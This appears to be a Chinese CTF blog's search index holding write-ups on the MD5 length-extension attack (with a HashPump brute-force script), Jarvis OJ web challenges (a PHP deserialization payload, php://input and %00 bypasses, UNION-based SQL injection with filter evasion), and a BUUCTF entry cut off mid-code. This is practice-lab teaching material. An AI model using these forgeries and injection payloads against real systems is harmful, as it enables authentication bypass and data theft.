<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HASH长度扩展攻击</title>
    <url>/2019/11/30/md5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。<a id="more"></a></p>
<h1 id="md5的工作原理"><a href="#md5的工作原理" class="headerlink" title="md5的工作原理"></a>md5的工作原理</h1><p>如下图所示</p>
<img src="/2019/11/30/md5扩展攻击/1.png" srcset="/img/loading.gif" title="image">

<p>其中笼统的一共可以分为四个部分</p>
<p><strong>*Padding填充</strong></p>
<p><strong>*Length填充长度</strong></p>
<p><strong>*初始化向量</strong></p>
<p><strong>*复杂的函数运算</strong>（这里可以忽略）</p>
<p>大体概括：md5是分组加密。加密时以每512bit(64byte=&gt;16个数字)为一组，从第一组开始，与四个固定的初始化向量进行复杂运算，进而得到四个新的向量，再将<strong>计算得到的向量作为下一组运算的初始向量</strong>继续运算。</p>
<p>但是显而易见我们加密的字符大多数情况下不能正好为64byte，md5以填充的方式解决这个问题。</p>
<h2 id="Padding填充"><a href="#Padding填充" class="headerlink" title="Padding填充"></a>Padding填充</h2><p><u><strong>填多少</strong></u></p>
<p>md5根据消息的长度来确定填充的字节数，由于64byte中最后的8byte用来存储原消息长度，故</p>
<p>填充后消息长度 mod 512 = 448 (512-8*8)  bit</p>
<p>eg.如果信息是‘message’ -&gt; 7byte -&gt; 56bit，那么就填充392bit。</p>
<p><u><strong>填啥</strong></u></p>
<p>使用二进制补位</p>
<p>10000000 …</p>
<p>转成十六进制就是第一个字节是0x80，剩余数据用 0x00 填充。</p>
<p>承上面那个例子，那么这里要填 0x80 + 0x00 *48</p>
<p><strong><u>填充消息长度</u></strong></p>
<p>这里需要注意长度是小端存储的，即高字节存放在高地址中。</p>
<h2 id="初始化向量"><a href="#初始化向量" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>A      01 23 45 67     0x67452301<br>B      89 AB CD EF  0xEFCDAB89<br>C      FE DC BA 98  0x98BADCFE<br>D      76 54 32 10     0x10325476</p>
<p>以上是四个固定的初始化向量，他们也是小端存储。</p>
<p>再与补位后的消息进行复杂运算后，还是上面的‘message’例子，最终得到的md5<em>值是</em>78e731027d8fd50ed642340b7c9a63b3。</p>
<img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image">

<h1 id="MD5长度扩展攻击"><a href="#MD5长度扩展攻击" class="headerlink" title="MD5长度扩展攻击"></a>MD5长度扩展攻击</h1><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现：</p>
<p>1.我们要知道salt的长度。(为了能得到正确的填充）<br>2.要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。<br>3.用户可以提交md5值。</p>
<p>例如我们知道一条信息的MD5值是78e731027d8fd50ed642340b7c9a63b3，我们还同时得知信息内容为message，可以构造出下图（这里的信息可以替换成salt+已知信息，加盐情况下需要知道salt长度）</p>
<img src="/2019/11/30/md5扩展攻击/2.png" srcset="/img/loading.gif" title="image">

<p>然后它与初始向量复杂运算，得到</p>
<p>A=0x0231e778<br>B=0x0ed58f7d<br>C=0x0b3442d6<br>D=0xb3639a7c</p>
<p>也就是上面的MD5值。</p>
<p>若在已补位后的消息后继续追加字符串‘admin’，</p>
<p>则会对其再次进行补位成为第二组。</p>
<p>他会把上面得出的这组值作为初始向量，并与他进行复杂运算。这样会得到最终的md5值e53a681a30ff99e3f6522270ca7db244。</p>
<p>这个值是md5（消息+填充+追加消息）。实际上就是md5(message+admin)的值。</p>
<h2 id="原理实现"><a href="#原理实现" class="headerlink" title="原理实现"></a>原理实现</h2><h3 id="已知salt长度"><a href="#已知salt长度" class="headerlink" title="已知salt长度"></a><strong>已知salt长度</strong></h3><p><strong>实验吧–让我进去</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"XXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"XXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This secret is 15 characters long for security!</span>

<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"Congratulations! You are a registered user.\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"The flag is "</span><span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"You are not an admin! LEAVE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"sample-hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"admin"</span> <span class="token punctuation">.</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"source"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"source"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This source code is outputted here</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Admins Only<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token keyword">If</span> you have the correct credentials<span class="token punctuation">,</span> log in below<span class="token punctuation">.</span> <span class="token keyword">If</span> not<span class="token punctuation">,</span> please <span class="token constant">LEAVE</span><span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    Username<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
    Password<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Submit<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
<p>分析判断条件</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>只要user始终为admin,pw的值不为admin就可达成条件</p>
<p>同时已知user=admin，pw=admin的 <strong>sample-hash=571580b26c65f306376d4f64e53cb5c7</strong>（从cookie得到）</p>
<p>题中给出<strong>salt长度为15</strong></p>
<p>这里就可以使用md5扩展攻击，在原基础上添加任意消息即可达成目的。</p>
<p>工具hashpump</p>
<img src="/2019/11/30/md5扩展攻击/4.png" srcset="/img/loading.gif" title="image">

<p>因为user值不变，也相当于salt的一部分，所以data直接填admin，salt长度为20（15+5）</p>
<img src="/2019/11/30/md5扩展攻击/5.png" srcset="/img/loading.gif" title="image">

<pre><code>f599284f8f2116348036a3f46e79c12b</code></pre><p>传到cookie的getmein里</p>
<pre><code>password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dwm2</code></pre><p>由于还有个urldecode,转下码post上去得到flag。</p>
<p>//HashPump下载</p>
<pre><code>git clone https://github.com/bwall/HashPump
apt-get install g++ libssl-dev
cd HashPump
make
make install</code></pre><h3 id="未知salt长度"><a href="#未知salt长度" class="headerlink" title="未知salt长度"></a><strong>未知salt长度</strong></h3><p><strong>Jarvis OJ–flag在管理员手里</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token string">"guest"</span><span class="token punctuation">;</span>
                <span class="token variable">$salt</span> <span class="token operator">=</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//需要传入被序列化的数据</span>
                        <span class="token variable">$hsh</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"hsh"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span><span class="token operator">===</span><span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$hsh</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//strrve函数反转字符串</span>
                                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$role</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$hsh</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'hsh'</span><span class="token punctuation">,</span><span class="token variable">$hsh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>Welcome Admin<span class="token punctuation">.</span> Your flag is
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> <span class="token string">"&lt;h3>Only Admin can see the flag!!&lt;/h3>"</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//只截取了PHP部分</span>
</code></pre>
<p>分析代码，flag输出条件是 $role===”admin” &amp;&amp;hsh===md5($salt.strrev($_COOKIE[“role”]))</p>
<img src="/2019/11/30/md5扩展攻击/4.jpg" srcset="/img/loading.gif" title="image">

<p>这里得到<strong>$salt.strrev(s:5:”guest”;)</strong>的hsh，即$salt.’;"tseug":5:s’的md5值： hsh=3a4727d57463f122833d9e732f94e4e0</p>
<p>以上是已知条件。</p>
<p>满足第一个条件只需要比较时$role开头是admin,接下来的字符是’\0’即可。</p>
<p>结合条件二，就可以这样构造</p>
<p>s:5:”admin”;+padding+s:5:”guest”;</p>
<p>而问题在于我们并不知道salt的长度</p>
<p>===&gt;可以写脚本爆破(借脚本参考)</p>
<pre><code>#!/usr/bin/python
# -*- coding=utf -*-
import requests,hashpumpy,urllib


def webre():
    url = 'http://web.jarvisoj.com:32778/'
    sha = '3a4727d57463f122833d9e732f94e4e0'
    string0 = ';"tseug":5:s'
    string1 = ';"nimda":5:s'
    for i in range(15):
        digest, message = hashpumpy.hashpump(sha,string0,string1,i)
        payload ={'role':urllib.quote(message[::-1]), 'hsh':digest}  // quote()用于把url编码，    [::-1]用于反转字符
        print(i,payload) 
        html = requests.get(url,cookies=payload).content 
        if 'Welcome' in html: 
            print(html)
webre()</code></pre><p>hashpump库使用说明</p>
<pre><code>hashpump(...)
    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)
    Arguments:
        hexdigest(str):      Hex-encoded result of hashing key + original_data.
        original_data(str):  Known data used to get the hash result hexdigest.
        data_to_add(str):    Data to append
        key_length(int):     Length of unknown data prepended to the hash
    Returns:
        A tuple containing the new hex digest and the new message.
&gt;&gt;&gt; hashpumpy.hashpump('ffffffff', 'original_data', 'data_to_add', len('KEYKEYKEY'))
('e3c4a05f', 'original_datadata_to_add')</code></pre><p>===&gt; 也可以用bp爆破</p>
<img src="/2019/11/30/md5扩展攻击/7.png" srcset="/img/loading.gif" title="image">

<img src="/2019/11/30/md5扩展攻击/5.jpg" srcset="/img/loading.gif" title="image">

<p>参考：</p>
<p><a href="https://blog.csdn.net/qq1045553189/article/details/87566846" target="_blank" rel="noopener">https://blog.csdn.net/qq1045553189/article/details/87566846</a></p>
<p><a href="https://err0rzz.github.io/2017/09/18/hash长度扩展攻击/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>攻击原理</category>
      </categories>
      <tags>
        <tag>HASH</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvis OJ WEB WP</title>
    <url>/2019/11/13/Jarvis%20OJ(web)WP/</url>
    <content><![CDATA[<h1 id="jarvis-OJ"><a href="#jarvis-OJ" class="headerlink" title="jarvis OJ"></a>jarvis OJ</h1><h2 id="神盾局"><a href="#神盾局" class="headerlink" title="神盾局"></a>神盾局</h2><p>打开网页是一张图片<br>查看源码发现</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image1.png" srcset="/img/loading.gif" title="image">

<a id="more"></a>

<p>base64转码发现后面是shield.jpg<br>尝试一下 index.php发现如下源码</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image2.png" srcset="/img/loading.gif" title="image">

<p>大概就是如果传入的class值不为空 就把这个值赋给g<br>再把g反序列化后赋给x<br>输出将x传入readfile后的值<br>再看一下 shield.php</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image3.png" srcset="/img/loading.gif" title="image">

<p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 和\\<br>才能到file_get_contents函数读取文件</p>
<p>又读了一下showimg.php</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image4.png" srcset="/img/loading.gif" title="image">

<p>这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND<br>写个脚本</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image5.png" srcset="/img/loading.gif" title="image"> 

<p>O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br>把这个值传入<br>注意！！是class不是之前的img 而且是从原页面上传入</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image6.png" srcset="/img/loading.gif" title="image">

<p>得到flag</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>看源码啥也没有<br>看一眼robots.txt</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image7.png" srcset="/img/loading.gif" title="image">

<p>进这个文件 发现是假flag<br>抓包<br>admin随便改个值得到flag</p>
<h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><p>查看源码</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image8.png" srcset="/img/loading.gif" title="image">

<p>分析<br>传入的a里如果不为0.则echo hahah并return<br>没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4<br>才能运行flag.txt<br>每个条件都存在冲突<br>id php弱比较就能绕过 传入id=0e<br>a 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下<br>b eregi可以%00截断 b=%0041111111<br>查了下大佬的wp<br>说a这里可以应用伪协议php://input<br>构造payload:<br>?id=0e&amp;a=php://input&amp;b=%004111111<br>同时post值1112 is a nice lab!<br>得到这样的回显<br>Come ON!!! {/^HT2mCpcvOLf}</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image9.png" srcset="/img/loading.gif" title="image">

<p>盲猜他是个地址（长得也太难认了8</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image10.png" srcset="/img/loading.gif" title="image">

<p>进到这样一个界面 看见这样的形势 先测试一下sql注入</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image11.png" srcset="/img/loading.gif" title="image">

<p>确实是sql注入<br>可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image12.png" srcset="/img/loading.gif" title="image">

<p>先测试字段数</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image13.png" srcset="/img/loading.gif" title="image">

<p>说明字段为3</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" srcset="/img/loading.gif" title="image">

<p>双写绕过对select和union的过滤<br>数据库名</p>
<pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre><p>查到数据库名是test</p>
<p>表名</p>
<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">

<p>列名</p>
<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre><p>查出来是id,context,title</p>
<p>读文件</p>
<pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" srcset="/img/loading.gif" title="image">



<p><strong>持续更新</strong></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>jarvis OJ</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF WEB wp</title>
    <url>/2019/10/21/BUUCTFwp/</url>
    <content><![CDATA[<h1 id="BUUCTF-WEBwp"><a href="#BUUCTF-WEBwp" class="headerlink" title="BUUCTF WEBwp"></a><strong>BUUCTF WEBwp</strong></h1><ul>
<li><h2 id="HCTF2018WarmUp"><a href="#HCTF2018WarmUp" class="headerlink" title="HCTF2018WarmUp"></a>HCTF2018WarmUp</h2></li>
</ul>
<p>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p>
<a id="more"></a>

<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
